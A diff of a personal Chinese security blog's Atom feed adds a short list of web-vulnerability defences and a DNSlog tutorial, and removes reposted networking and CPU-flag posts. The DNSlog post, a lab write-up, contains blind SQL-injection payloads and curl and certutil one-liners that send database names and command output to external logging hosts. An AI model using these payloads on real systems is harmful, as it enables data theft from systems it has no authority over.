@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://Morn-zh.github.io</id>
     <title>Morn-zh</title>
-    <updated>2021-04-18T12:29:54.235Z</updated>
+    <updated>2021-04-20T13:29:49.889Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://Morn-zh.github.io"/>
     <link rel="self" href="https://Morn-zh.github.io/atom.xml"/>
@@ -10,6 +10,128 @@
     <logo>https://Morn-zh.github.io/images/avatar.png</logo>
     <icon>https://Morn-zh.github.io/favicon.ico</icon>
     <rights>All rights reserved 2021, Morn-zh</rights>
+    <entry>
+        <title type="html"><![CDATA[常见web漏洞防御措施汇总]]></title>
+        <id>https://Morn-zh.github.io/post/chang-jian-web-lou-dong-fang-yu-cuo-shi-hui-zong/</id>
+        <link href="https://Morn-zh.github.io/post/chang-jian-web-lou-dong-fang-yu-cuo-shi-hui-zong/">
+        </link>
+        <updated>2021-04-20T13:29:36.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="常见web漏洞防御措施汇总">常见web漏洞防御措施汇总</h1>
+<p>将之前学到和看到的web漏洞做下汇总吧，加深记忆的同时也方便以后的查阅~</p>
+<h2 id="sql注入">SQL注入</h2>
+<p>1、使用预编译，绑定变量。使用预编译过的语句，SQL语义不会发生改变。</p>
+<p>2、使用安全的存储过程</p>
+<p>3、检查数据类型，包括但不限于数据的类型、数据的长度、数据的格式。</p>
+<p>4、使用安全函数</p>
+<p>5、限制网站用户的数据库权限</p>
+<p>6、配置数据库安全参数</p>
+<h2 id="xss跨站脚本">XSS跨站脚本</h2>
+<p>1、使用HttpOnly，禁止页面的JS访问带有HttpOnly属性的Cookie（对抗Cookie劫持</p>
+<p>2、输入检查（客户端和服务端都需要进行检查</p>
+<p>3、输出检查（富文本输出、编码、转义</p>
+<p>4、使用安全的编码函数</p>
+<h2 id="csrf跨站请求伪造">CSRF跨站请求伪造</h2>
+<p>1、验证码</p>
+<p>2、Referer Check</p>
+<p>3、Anti SCRF Token</p>
+<h2 id="上传漏洞">上传漏洞</h2>
+<p>1、文件扩展名校验</p>
+<p>2、文件内容校验</p>
+<p>3、上传文件重命名</p>
+<p>4、文件上传目录设置权限</p>
+<h2 id="ddos攻击">DDos攻击</h2>
+<p>1、采用高性能的网络设备</p>
+<p>2、高带宽</p>
+<p>3、安装防火墙</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[DNSlog的使用]]></title>
+        <id>https://Morn-zh.github.io/post/dnslog-de-shi-yong/</id>
+        <link href="https://Morn-zh.github.io/post/dnslog-de-shi-yong/">
+        </link>
+        <updated>2021-04-20T07:25:49.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="dnslog的使用">DNSlog的使用</h1>
+<h2 id="原理">原理</h2>
+<p>DNS服务器解析域名的时候会留下log日志，如果DNS服务器是自己的，那么我们就可以从log信息中获得信息</p>
+<h2 id="应用场景">应用场景</h2>
+<p>1、SQL注入中的盲注</p>
+<p>2、无回显的命令执行</p>
+<p>3、无回显的SSRF</p>
+<h2 id="使用到的函数">使用到的函数</h2>
+<p>load_file()函数</p>
+<p>load_file()使用限制：</p>
+<p>1.文件必须位于服务器主机上。</p>
+<p>2.当前用户必须具有读取文件的权限</p>
+<pre><code>select * from mysql.user where user='user_name';
+</code></pre>
+<p>3.文件的大小小于max_allowed_packet字节。（暂时不清楚实际渗透过程中会不会遇到</p>
+<p>4.读取的文件位于secure_file_priv设置的范围内</p>
+<pre><code>SHOW VARIABLES LIKE 'secure_file_priv';
+</code></pre>
+<p>Q：为什么要用load_file函数呢？</p>
+<p>A：因为load_file函数可以解析dns请求。</p>
+<p>数据库中使用此payload：select load_file('\\SQL注入查询语句.a.com')</p>
+<p>注意：load_file函数在Linux下是无法用来做dnslog攻击的，因为在这里就涉及到Windows的一个小Tips——UNC路径。</p>
+<h2 id="环境">环境</h2>
+<p>dnslog.cn</p>
+<p>sqli-labs-Less-5</p>
+<h2 id="实践">实践</h2>
+<p>判断存在注入，并且无明显回显，这里我们考虑下使用DNSlog</p>
+<h3 id="获取dns域名">获取DNS域名</h3>
+<p>先访问<a href="dnslog.cn">dnslog.cn</a>，谷歌浏览器，似乎需要翻墙</p>
+<p>获得一个域名</p>
+<p>这里我获得的域名是：4325u7.dnslog.cn</p>
+<h3 id="注入开始">注入开始</h3>
+<p>payload：</p>
+<pre><code>http://127.0.0.1/sqli-lab/Less-5/?id=1' and if((select load_file(concat('\\\\',(select database()),'.4325u7.dnslog.cn\\aaa'))),1,1)--+
+</code></pre>
+<p>页面会加载一会儿，可能是网络原因</p>
+<p>查看DNSlog信息</p>
+<figure data-type="image" tabindex="1"><img src="https://Morn-zh.github.io/post-images/dnslog/QQ%E6%88%AA%E5%9B%BE20210420150952.png" alt="QQ截图20210420150952" loading="lazy"></figure>
+<p>可以看到，数据库名信息就会放到和域名信息一起被记录到DNSlog里面了</p>
+<p>查看表名</p>
+<pre><code>' and if((select load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema=database() limit 0,1),'.4325u7.dnslog.cn\\aaa'))),1,1)--+
+</code></pre>
+<p>……</p>
+<h2 id="搭建dnslog服务器">搭建DNSlog服务器</h2>
+<p>这⾥推荐BugScanTeam的 https://github.com/BugScanTeam/DNSLog ，该项⽬主页是有搭建教程的，按⾃⼰的 需求搭建。</p>
+<h2 id="使用中间件日志">使用中间件日志</h2>
+<p>除了DNS的log，在可以执⾏系统命令的情况还可以利⽤HTTP的log，就是通过<strong>中间件的⽇志</strong>来获取结果。</p>
+<h4 id="linux">Linux</h4>
+<pre><code>for /F &quot;delims=\&quot; %i in ('whoami') do curl https://www.yourweb.net/%i 
+</code></pre>
+<p>如果碰到内容有空格（换⾏符等），就会截断，只输出前⾯的，这时候可以利⽤编码来输出，但有输出字符数最⼤ 限制；</p>
+<pre><code>curl http://xxx.dnslog.link/$(id|base64)
+curl http://xxx.dnslog.link/`id|base64`
+</code></pre>
+<h4 id="windows">windows</h4>
+<p>#启动浏览器访问</p>
+<pre><code>for /F %x in ('whoami') do start https://yourweb.net/%x
+</code></pre>
+<p>#内置命令⾏⼯具访问</p>
+<pre><code>for /F %x in ('whoami') do certutil.exe -urlcache -split -f https://www.yourweb.net/%x
+</code></pre>
+<p>#只列出⽂件名</p>
+<pre><code>for /F %x in ('dir /b') do certutil.exe -urlcache -split -f https://www.yourweb.net/%x
+</code></pre>
+<p>windows下的base64编码</p>
+<p>暂时未找到能直接像Linux那样可以通过管道来加密的，但通过多次命令的执⾏达到先base64加密，再做HTTP请求</p>
+<pre><code>whoami &gt; result.txt
+certutil -encode result.txt result_bs64
+for /f %x in (result_bs64) do certutil.exe -urlcache -split -f http://www.yourweb.net/%x
+</code></pre>
+<p>每⼀个请求都会出现两个请求⽇志，所以要去重复！</p>
+<p>并把结果保存为result_bs64_local ，然后再把这个result_bs64_local ⾥⾯加密的⽂件内容解密，命令为：</p>
+<pre><code>certutil -decode result_bs64_local result_local.txt
+</code></pre>
+<h2 id="总结">总结</h2>
+<p>参考文章：</p>
+<p>https://www.cnblogs.com/sunny11/p/14399420.html</p>
+<p>后续需要看:</p>
+<p><a href="https://www.cnblogs.com/sunny11/p/14522023.html">Getshell的姿势总结</a></p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[sqlmap的实践与总结]]></title>
         <id>https://Morn-zh.github.io/post/sqlmap-de-shi-jian-yu-zong-jie/</id>
@@ -1360,229 +1482,6 @@ table_name='users'
 <figure data-type="image" tabindex="10"><img src="http://www.ruanyifeng.com/blogimg/asset/201206/bg2012061104.jpg" alt="img" loading="lazy"></figure>
 <p>这个例子就到此为止，虽然经过了简化，但它大致上反映了互联网协议的整个通信过程。</p>
 <p>（完）</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[（转载）互联网协议入门（一）]]></title>
-        <id>https://Morn-zh.github.io/post/zhuan-zai-hu-lian-wang-xie-yi-ru-men-yi/</id>
-        <link href="https://Morn-zh.github.io/post/zhuan-zai-hu-lian-wang-xie-yi-ru-men-yi/">
-        </link>
-        <updated>2020-11-24T11:32:10.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="转载互联网协议入门一">（转载）互联网协议入门（一）</h1>
-<p>作者： <a href="http://www.ruanyifeng.com/">阮一峰</a></p>
-<p>日期： <a href="http://www.ruanyifeng.com/blog/2012/05/">2012年5月31日</a></p>
-<p>我们每天使用互联网，你是否想过，它是如何实现的？</p>
-<p>全世界几十亿台电脑，连接在一起，两两通信。上海的某一块网卡送出信号，洛杉矶的另一块网卡居然就收到了，两者实际上根本不知道对方的物理位置，你不觉得这是很神奇的事情吗？</p>
-<p>互联网的核心是一系列协议，总称为&quot;互联网协议&quot;（Internet Protocol Suite）。它们对电脑如何连接和组网，做出了详尽的规定。理解了这些协议，就理解了互联网的原理。</p>
-<p>下面就是我的学习笔记。因为这些协议实在太复杂、太庞大，我想整理一个简洁的框架，帮助自己从总体上把握它们。为了保证简单易懂，我做了大量的简化，有些地方并不全面和精确，但是应该能够说清楚互联网的原理。</p>
-<p>=================================================</p>
-<p><strong>互联网协议入门</strong></p>
-<p>作者：阮一峰</p>
-<figure data-type="image" tabindex="1"><img src="http://www.ruanyifeng.com/blogimg/asset/201205/bg2012052901.jpg" alt="img" loading="lazy"></figure>
-<p><strong>一、概述</strong></p>
-<p><strong>1.1 五层模型</strong></p>
-<p>互联网的实现，分成好几层。每一层都有自己的功能，就像建筑物一样，每一层都靠下一层支持。</p>
-<p>用户接触到的，只是最上面的一层，根本没有感觉到下面的层。要理解互联网，必须从最下层开始，自下而上理解每一层的功能。</p>
-<p>如何分层有不同的模型，有的模型分七层，有的分四层。我觉得，把互联网分成五层，比较容易解释。</p>
-<figure data-type="image" tabindex="2"><img src="http://www.ruanyifeng.com/blogimg/asset/201205/bg2012052902.png" alt="img" loading="lazy"></figure>
-<p>如上图所示，最底下的一层叫做&quot;实体层&quot;（Physical Layer），最上面的一层叫做&quot;应用层&quot;（Application Layer），中间的三层（自下而上）分别是&quot;链接层&quot;（Link Layer）、&quot;网络层&quot;（Network Layer）和&quot;传输层&quot;（Transport Layer）。越下面的层，越靠近硬件；越上面的层，越靠近用户。</p>
-<p>它们叫什么名字，其实并不重要。只需要知道，互联网分成若干层就可以了。</p>
-<p><strong>1.2 层与协议</strong></p>
-<p>每一层都是为了完成一种功能。为了实现这些功能，就需要大家都遵守共同的规则。</p>
-<p>大家都遵守的规则，就叫做&quot;协议&quot;（protocol）。</p>
-<p>互联网的每一层，都定义了很多协议。这些协议的总称，就叫做&quot;互联网协议&quot;（Internet Protocol Suite）。它们是互联网的核心，下面介绍每一层的功能，主要就是介绍每一层的主要协议。</p>
-<p><strong>二、实体层</strong></p>
-<p>我们从最底下的一层开始。</p>
-<p>电脑要组网，第一件事要干什么？当然是先把电脑连起来，可以用光缆、电缆、双绞线、无线电波等方式。</p>
-<figure data-type="image" tabindex="3"><img src="http://www.ruanyifeng.com/blogimg/asset/201205/bg2012052903.png" alt="img" loading="lazy"></figure>
-<p><strong>这就叫做&quot;实体层&quot;，它就是把电脑连接起来的物理手段。它主要规定了网络的一些电气特性，作用是负责传送0和1的电信号。</strong></p>
-<p><strong>三、链接层</strong></p>
-<p><strong>3.1 定义</strong></p>
-<p>单纯的0和1没有任何意义，必须规定解读方式：多少个电信号算一组？每个信号位有何意义？</p>
-<p><strong>这就是&quot;链接层&quot;的功能，它在&quot;实体层&quot;的上方，确定了0和1的分组方式。</strong></p>
-<p><strong>3.2 以太网协议</strong></p>
-<p>早期的时候，每家公司都有自己的电信号分组方式。逐渐地，一种叫做<a href="http://zh.wikipedia.org/wiki/%E4%BB%A5%E5%A4%AA%E7%BD%91">&quot;以太网&quot;</a>（Ethernet）的协议，占据了主导地位。</p>
-<p>以太网规定，一组电信号构成一个数据包，叫做&quot;帧&quot;（Frame）。每一帧分成两个部分：标头（Head）和数据（Data）。</p>
-<figure data-type="image" tabindex="4"><img src="http://www.ruanyifeng.com/blogimg/asset/201205/bg2012052904.png" alt="img" loading="lazy"></figure>
-<p>&quot;标头&quot;包含数据包的一些说明项，比如发送者、接受者、数据类型等等；&quot;数据&quot;则是数据包的具体内容。</p>
-<p>&quot;标头&quot;的长度，固定为18字节。&quot;数据&quot;的长度，最短为46字节，最长为1500字节。因此，整个&quot;帧&quot;最短为64字节，最长为1518字节。如果数据很长，就必须分割成多个帧进行发送。</p>
-<p><strong>3.3 MAC地址</strong></p>
-<p>上面提到，以太网数据包的&quot;标头&quot;，包含了发送者和接受者的信息。那么，发送者和接受者是如何标识呢？</p>
-<p>以太网规定，连入网络的所有设备，都必须具有&quot;网卡&quot;接口。数据包必须是从一块网卡，传送到另一块网卡。网卡的地址，就是数据包的发送地址和接收地址，这叫做MAC地址。</p>
-<figure data-type="image" tabindex="5"><img src="http://www.ruanyifeng.com/blogimg/asset/201205/bg2012052905.jpg" alt="img" loading="lazy"></figure>
-<p>每块网卡出厂的时候，都有一个全世界独一无二的MAC地址，长度是48个二进制位，通常用12个十六进制数表示。</p>
-<figure data-type="image" tabindex="6"><img src="http://www.ruanyifeng.com/blogimg/asset/201205/bg2012052906.png" alt="img" loading="lazy"></figure>
-<p>前6个十六进制数是厂商编号，后6个是该厂商的网卡流水号。有了MAC地址，就可以定位网卡和数据包的路径了。</p>
-<p><strong>3.4 广播</strong></p>
-<p>定义地址只是第一步，后面还有更多的步骤。</p>
-<p>首先，一块网卡怎么会知道另一块网卡的MAC地址？</p>
-<p>回答是有一种ARP协议，可以解决这个问题。这个留到后面介绍，这里只需要知道，以太网数据包必须知道接收方的MAC地址，然后才能发送。</p>
-<p>其次，就算有了MAC地址，系统怎样才能把数据包准确送到接收方？</p>
-<p>回答是以太网采用了一种很&quot;原始&quot;的方式，它不是把数据包准确送到接收方，而是向本网络内所有计算机发送，让每台计算机自己判断，是否为接收方。</p>
-<figure data-type="image" tabindex="7"><img src="http://www.ruanyifeng.com/blogimg/asset/201205/bg2012052907.png" alt="img" loading="lazy"></figure>
-<p>上图中，1号计算机向2号计算机发送一个数据包，同一个子网络的3号、4号、5号计算机都会收到这个包。它们读取这个包的&quot;标头&quot;，找到接收方的MAC地址，然后与自身的MAC地址相比较，如果两者相同，就接受这个包，做进一步处理，否则就丢弃这个包。这种发送方式就叫做&quot;广播&quot;（broadcasting）。</p>
-<p>有了数据包的定义、网卡的MAC地址、广播的发送方式，&quot;链接层&quot;就可以在多台计算机之间传送数据了。</p>
-<p><strong>四、网络层</strong></p>
-<p><strong>4.1 网络层的由来</strong></p>
-<p>以太网协议，依靠MAC地址发送数据。理论上，单单依靠MAC地址，上海的网卡就可以找到洛杉矶的网卡了，技术上是可以实现的。</p>
-<p>但是，这样做有一个重大的缺点。以太网采用广播方式发送数据包，所有成员人手一&quot;包&quot;，不仅效率低，而且局限在发送者所在的子网络。也就是说，如果两台计算机不在同一个子网络，广播是传不过去的。这种设计是合理的，否则互联网上每一台计算机都会收到所有包，那会引起灾难。</p>
-<p>互联网是无数子网络共同组成的一个巨型网络，很像想象上海和洛杉矶的电脑会在同一个子网络，这几乎是不可能的。</p>
-<figure data-type="image" tabindex="8"><img src="http://www.ruanyifeng.com/blogimg/asset/201205/bg2012052914.png" alt="img" loading="lazy"></figure>
-<p>因此，必须找到一种方法，能够区分哪些MAC地址属于同一个子网络，哪些不是。如果是同一个子网络，就采用广播方式发送，否则就采用&quot;路由&quot;方式发送。（&quot;路由&quot;的意思，就是指如何向不同的子网络分发数据包，这是一个很大的主题，本文不涉及。）遗憾的是，MAC地址本身无法做到这一点。它只与厂商有关，与所处网络无关。</p>
-<p><strong>这就导致了&quot;网络层&quot;的诞生。它的作用是引进一套新的地址，使得我们能够区分不同的计算机是否属于同一个子网络。这套地址就叫做&quot;网络地址&quot;，简称&quot;网址&quot;。</strong></p>
-<p>于是，&quot;网络层&quot;出现以后，每台计算机有了两种地址，一种是MAC地址，另一种是网络地址。两种地址之间没有任何联系，MAC地址是绑定在网卡上的，网络地址则是管理员分配的，它们只是随机组合在一起。</p>
-<p>网络地址帮助我们确定计算机所在的子网络，MAC地址则将数据包送到该子网络中的目标网卡。因此，从逻辑上可以推断，必定是先处理网络地址，然后再处理MAC地址。</p>
-<p><strong>4.2 IP协议</strong></p>
-<p>规定网络地址的协议，叫做IP协议。它所定义的地址，就被称为IP地址。</p>
-<p>目前，广泛采用的是IP协议第四版，简称IPv4。这个版本规定，网络地址由32个二进制位组成。</p>
-<figure data-type="image" tabindex="9"><img src="http://www.ruanyifeng.com/blogimg/asset/201205/bg2012052908.png" alt="img" loading="lazy"></figure>
-<p>习惯上，我们用分成四段的十进制数表示IP地址，从0.0.0.0一直到255.255.255.255。</p>
-<p>互联网上的每一台计算机，都会分配到一个IP地址。这个地址分成两个部分，前一部分代表网络，后一部分代表主机。比如，IP地址172.16.254.1，这是一个32位的地址，假定它的网络部分是前24位（172.16.254），那么主机部分就是后8位（最后的那个1）。处于同一个子网络的电脑，它们IP地址的网络部分必定是相同的，也就是说172.16.254.2应该与172.16.254.1处在同一个子网络。</p>
-<p>但是，问题在于单单从IP地址，我们无法判断网络部分。还是以172.16.254.1为例，它的网络部分，到底是前24位，还是前16位，甚至前28位，从IP地址上是看不出来的。</p>
-<p>那么，怎样才能从IP地址，判断两台计算机是否属于同一个子网络呢？这就要用到另一个参数&quot;子网掩码&quot;（subnet mask）。</p>
-<p>所谓&quot;子网掩码&quot;，就是表示子网络特征的一个参数。它在形式上等同于IP地址，也是一个32位二进制数字，它的网络部分全部为1，主机部分全部为0。比如，IP地址172.16.254.1，如果已知网络部分是前24位，主机部分是后8位，那么子网络掩码就是11111111.11111111.11111111.00000000，写成十进制就是255.255.255.0。</p>
-<p>知道&quot;子网掩码&quot;，我们就能判断，任意两个IP地址是否处在同一个子网络。方法是将两个IP地址与子网掩码分别进行AND运算（两个数位都为1，运算结果为1，否则为0），然后比较结果是否相同，如果是的话，就表明它们在同一个子网络中，否则就不是。</p>
-<p>比如，已知IP地址172.16.254.1和172.16.254.233的子网掩码都是255.255.255.0，请问它们是否在同一个子网络？两者与子网掩码分别进行AND运算，结果都是172.16.254.0，因此它们在同一个子网络。</p>
-<p>总结一下，IP协议的作用主要有两个，一个是为每一台计算机分配IP地址，另一个是确定哪些地址在同一个子网络。</p>
-<p><strong>4.3 IP数据包</strong></p>
-<p>根据IP协议发送的数据，就叫做IP数据包。不难想象，其中必定包括IP地址信息。</p>
-<p>但是前面说过，以太网数据包只包含MAC地址，并没有IP地址的栏位。那么是否需要修改数据定义，再添加一个栏位呢？</p>
-<p>回答是不需要，我们可以把IP数据包直接放进以太网数据包的&quot;数据&quot;部分，因此完全不用修改以太网的规格。这就是互联网分层结构的好处：上层的变动完全不涉及下层的结构。</p>
-<p>具体来说，IP数据包也分为&quot;标头&quot;和&quot;数据&quot;两个部分。</p>
-<figure data-type="image" tabindex="10"><img src="http://www.ruanyifeng.com/blogimg/asset/201205/bg2012052909.png" alt="img" loading="lazy"></figure>
-<p>&quot;标头&quot;部分主要包括版本、长度、IP地址等信息，&quot;数据&quot;部分则是IP数据包的具体内容。它放进以太网数据包后，以太网数据包就变成了下面这样。</p>
-<figure data-type="image" tabindex="11"><img src="http://www.ruanyifeng.com/blogimg/asset/201205/bg2012052910.png" alt="img" loading="lazy"></figure>
-<p>IP数据包的&quot;标头&quot;部分的长度为20到60字节，整个数据包的总长度最大为65,535字节。因此，理论上，一个IP数据包的&quot;数据&quot;部分，最长为65,515字节。前面说过，以太网数据包的&quot;数据&quot;部分，最长只有1500字节。因此，如果IP数据包超过了1500字节，它就需要分割成几个以太网数据包，分开发送了。</p>
-<p><strong>4.4 ARP协议</strong></p>
-<p>关于&quot;网络层&quot;，还有最后一点需要说明。</p>
-<p>因为IP数据包是放在以太网数据包里发送的，所以我们必须同时知道两个地址，一个是对方的MAC地址，另一个是对方的IP地址。通常情况下，对方的IP地址是已知的（后文会解释），但是我们不知道它的MAC地址。</p>
-<p>所以，我们需要一种机制，能够从IP地址得到MAC地址。</p>
-<p>这里又可以分成两种情况。第一种情况，如果两台主机不在同一个子网络，那么事实上没有办法得到对方的MAC地址，只能把数据包传送到两个子网络连接处的&quot;网关&quot;（gateway），让网关去处理。</p>
-<p>第二种情况，如果两台主机在同一个子网络，那么我们可以用ARP协议，得到对方的MAC地址。ARP协议也是发出一个数据包（包含在以太网数据包中），其中包含它所要查询主机的IP地址，在对方的MAC地址这一栏，填的是FF:FF:FF:FF:FF:FF，表示这是一个&quot;广播&quot;地址。它所在子网络的每一台主机，都会收到这个数据包，从中取出IP地址，与自身的IP地址进行比较。如果两者相同，都做出回复，向对方报告自己的MAC地址，否则就丢弃这个包。</p>
-<p>总之，有了ARP协议之后，我们就可以得到同一个子网络内的主机MAC地址，可以把数据包发送到任意一台主机之上了。</p>
-<p><strong>五、传输层</strong></p>
-<p><strong>5.1 传输层的由来</strong></p>
-<p>有了MAC地址和IP地址，我们已经可以在互联网上任意两台主机上建立通信。</p>
-<p>接下来的问题是，同一台主机上有许多程序都需要用到网络，比如，你一边浏览网页，一边与朋友在线聊天。当一个数据包从互联网上发来的时候，你怎么知道，它是表示网页的内容，还是表示在线聊天的内容？</p>
-<p>也就是说，我们还需要一个参数，表示这个数据包到底供哪个程序（进程）使用。这个参数就叫做&quot;端口&quot;（port），它其实是每一个使用网卡的程序的编号。每个数据包都发到主机的特定端口，所以不同的程序就能取到自己所需要的数据。</p>
-<p>&quot;端口&quot;是0到65535之间的一个整数，正好16个二进制位。0到1023的端口被系统占用，用户只能选用大于1023的端口。不管是浏览网页还是在线聊天，应用程序会随机选用一个端口，然后与服务器的相应端口联系。</p>
-<p>**&quot;传输层&quot;的功能，就是建立&quot;端口到端口&quot;的通信。相比之下，&quot;网络层&quot;的功能是建立&quot;主机到主机&quot;的通信。只要确定主机和端口，我们就能实现程序之间的交流。**因此，Unix系统就把主机+端口，叫做&quot;套接字&quot;（socket）。有了它，就可以进行网络应用程序开发了。</p>
-<p><strong>5.2 UDP协议</strong></p>
-<p>现在，我们必须在数据包中加入端口信息，这就需要新的协议。最简单的实现叫做UDP协议，它的格式几乎就是在数据前面，加上端口号。</p>
-<p>UDP数据包，也是由&quot;标头&quot;和&quot;数据&quot;两部分组成。</p>
-<figure data-type="image" tabindex="12"><img src="http://www.ruanyifeng.com/blogimg/asset/201205/bg2012052911.png" alt="img" loading="lazy"></figure>
-<p>&quot;标头&quot;部分主要定义了发出端口和接收端口，&quot;数据&quot;部分就是具体的内容。然后，把整个UDP数据包放入IP数据包的&quot;数据&quot;部分，而前面说过，IP数据包又是放在以太网数据包之中的，所以整个以太网数据包现在变成了下面这样：</p>
-<figure data-type="image" tabindex="13"><img src="http://www.ruanyifeng.com/blogimg/asset/201205/bg2012052912.png" alt="img" loading="lazy"></figure>
-<p>UDP数据包非常简单，&quot;标头&quot;部分一共只有8个字节，总长度不超过65,535字节，正好放进一个IP数据包。</p>
-<p><strong>5.3 TCP协议</strong></p>
-<p>UDP协议的优点是比较简单，容易实现，但是缺点是可靠性较差，一旦数据包发出，无法知道对方是否收到。</p>
-<p>为了解决这个问题，提高网络可靠性，TCP协议就诞生了。这个协议非常复杂，但可以近似认为，它就是有确认机制的UDP协议，每发出一个数据包都要求确认。如果有一个数据包遗失，就收不到确认，发出方就知道有必要重发这个数据包了。</p>
-<p>因此，TCP协议能够确保数据不会遗失。它的缺点是过程复杂、实现困难、消耗较多的资源。</p>
-<p>TCP数据包和UDP数据包一样，都是内嵌在IP数据包的&quot;数据&quot;部分。TCP数据包没有长度限制，理论上可以无限长，但是为了保证网络的效率，通常TCP数据包的长度不会超过IP数据包的长度，以确保单个TCP数据包不必再分割。</p>
-<p><strong>六、应用层</strong></p>
-<p>应用程序收到&quot;传输层&quot;的数据，接下来就要进行解读。由于互联网是开放架构，数据来源五花八门，必须事先规定好格式，否则根本无法解读。</p>
-<p><strong>&quot;应用层&quot;的作用，就是规定应用程序的数据格式。</strong></p>
-<p>举例来说，TCP协议可以为各种各样的程序传递数据，比如Email、WWW、FTP等等。那么，必须有不同协议规定电子邮件、网页、FTP数据的格式，这些应用程序协议就构成了&quot;应用层&quot;。</p>
-<p>这是最高的一层，直接面对用户。它的数据就放在TCP数据包的&quot;数据&quot;部分。因此，现在的以太网的数据包就变成下面这样。</p>
-<figure data-type="image" tabindex="14"><img src="http://www.ruanyifeng.com/blogimg/asset/201205/bg2012052913.png" alt="img" loading="lazy"></figure>
-<p>至此，整个互联网的五层结构，自下而上全部讲完了。这是从系统的角度，解释互联网是如何构成的。下一篇，我反过来，从用户的角度，自上而下看看这个结构是如何发挥作用，完成一次网络数据交换的。</p>
-<p>（完）</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[CF OF 进位 溢出]]></title>
-        <id>https://Morn-zh.github.io/post/cf-of-jin-wei-yi-chu/</id>
-        <link href="https://Morn-zh.github.io/post/cf-of-jin-wei-yi-chu/">
-        </link>
-        <updated>2020-10-30T11:12:32.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="0x01-我的问题">0x01 我的问题</h1>
-<ul>
-<li>Q：CF表示进位，OF表示溢出，那么进位是否表示溢出，又或者溢出是否就一定会有进位？</li>
-</ul>
-<p>想要直接看答案，直接跳转<strong>0x04 回到问题</strong>，想要理解过程可以接着往下看</p>
-<h1 id="0x02-相关的知识">0x02 相关的知识</h1>
-<p>解答疑问之前，先明确下，溢出是<strong>所要表示的数值</strong>超出了<strong>本身能够表示的范围</strong></p>
-<p>以8位寄存器为例，来看看在将<strong>操作数</strong>视为<strong>无符号数</strong>和<strong>有符号数</strong>时能够表示的范围</p>
-<p>操作数 xxxx xxxx</p>
-<p>无符号数 xxxx xxxx</p>
-<p>有符号数 符号位+xxx xxxx</p>
-<table>
-<thead>
-<tr>
-<th></th>
-<th>范围</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>无符号数</td>
-<td>0~2<sup>8</sup>-1</td>
-</tr>
-<tr>
-<td>有符号数</td>
-<td>-2<sup>7</sup>~2<sup>7</sup>-1</td>
-</tr>
-</tbody>
-</table>
-<p><strong>标志位CF/OF为1时，表示的含义</strong></p>
-<table>
-<thead>
-<tr>
-<th>标志位</th>
-<th>含义</th>
-<th>表示结果是否正确（将进位值作为权值考虑在内）</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>CF=1</td>
-<td><strong>无符号数</strong>运算超出范围</td>
-<td><strong>依旧正确</strong></td>
-</tr>
-<tr>
-<td>OF=1</td>
-<td><strong>有符号数</strong>运算超出范围</td>
-<td>错误</td>
-</tr>
-</tbody>
-</table>
-<p>例1：操作数看做无符号数，关注CF<br>
-<img src="https://Morn-zh.github.io/post-images/1604056428774.png" alt="" loading="lazy"></p>
-<p>例2：操作数看做无符号数，关注CF</p>
-<figure data-type="image" tabindex="1"><img src="https://Morn-zh.github.io/post-images/1604056465337.png" alt="" loading="lazy"></figure>
-<p>将例1看做有符号数，关注OF</p>
-<figure data-type="image" tabindex="2"><img src="https://Morn-zh.github.io/post-images/1604056485295.png" alt="" loading="lazy"></figure>
-<p>将例2看做有符号数，关注OF</p>
-<figure data-type="image" tabindex="3"><img src="https://Morn-zh.github.io/post-images/1604056493045.png" alt="" loading="lazy"></figure>
-<h1 id="0x03-怎么理解呢">0x03 怎么理解呢？</h1>
-<p>处理器会<strong>同时</strong>按照<strong>无符号</strong>和<strong>有符号</strong>运算法则进行运算，并且设置CF和OF两个标志位</p>
-<p>==&gt;也就是说操作数进入运算器后，运算器会进行两次运算，分别设置CF和OF标志位</p>
-<p><strong>至于如何利用这两个设置好的标志位，这将取决于程序员</strong></p>
-<ul>
-<li>如果程序员想要进行<strong>有符号数运算</strong>，那么将关注<strong>OF</strong>的情况，通过OF标志位判断计算结果是否溢出</li>
-<li>如果程序员想要进行<strong>无符号数运算</strong>，那么将关注<strong>CF</strong>的情况，通过CF标志位判断是否需要进位</li>
-</ul>
-<p>另外，还可以这样说</p>
-<ul>
-<li>对于<strong>无符号数</strong>来说，只有是否<strong>进位</strong>，不存在溢出</li>
-<li>对于<strong>有符号数</strong>来说，只有是否<strong>溢出</strong>，不存在进位</li>
-</ul>
-<p>存在这样的关系</p>
-<p>无符号数 &lt;------&gt; 进位 &lt;------&gt; CF</p>
-<p>有符号数 &lt;------&gt; 溢出 &lt;------&gt; OF</p>
-<h1 id="0x04-回到问题">0x04 回到问题</h1>
-<p>Q：CF表示进位，OF表示溢出，那么进位是否表示溢出，又或者溢出是否就一定会有进位？</p>
-<p>A：进位不一定溢出，溢出也不一定进位，因为这两个概念对应两个不同的标志位CF、OF，而这两个标志位又是相对有符号数和无符号数来说的。</p>
-<ul>
-<li>
-<p>如果我们将操作数看做无符号数，此时只需要考虑是否进位，与是否溢出的无关</p>
-</li>
-<li>
-<p>如果将操作数看做有符号数，此时我们应该关心运算结果是否溢出，与是否进位无关</p>
-</li>
-</ul>
-<p>如果看不懂，可以回看理解的过程</p>
-<p>如果理解或者解答有误，请及时联系，我将第一时间进行更正，万分谢谢！</p>
 ]]></content>
     </entry>
 </feed>
